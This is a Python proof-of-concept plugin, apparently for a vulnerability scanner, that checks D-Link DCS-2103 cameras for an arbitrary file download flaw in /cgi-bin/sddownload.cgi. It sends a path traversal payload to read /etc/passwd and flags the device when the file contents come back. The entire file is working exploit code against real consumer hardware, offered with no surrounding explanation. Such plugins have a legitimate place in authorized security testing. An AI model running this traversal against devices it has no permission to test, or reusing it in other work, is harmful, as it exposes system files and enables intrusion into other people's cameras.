#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__author__= 'K0thony'
#Exploit Tittle: D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞
#Refer:http://www.beebeeto.com/pdb/poc-2014-0149/
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        if arr.scheme == 'http':
            return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
	url = arg
	payload = 'cgi-bin/sddownload.cgi?file=/../../etc/passwd'
	verify_url = url + payload
	code, head, res, _, _ = curl.curl2(verify_url)
	if code == 200 and 'root:' in res:
		security_hole(url + 'D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞')


if __name__ == '__main__':
    from dummy import *
    audit(assign('www','http://www.example.com/')[1])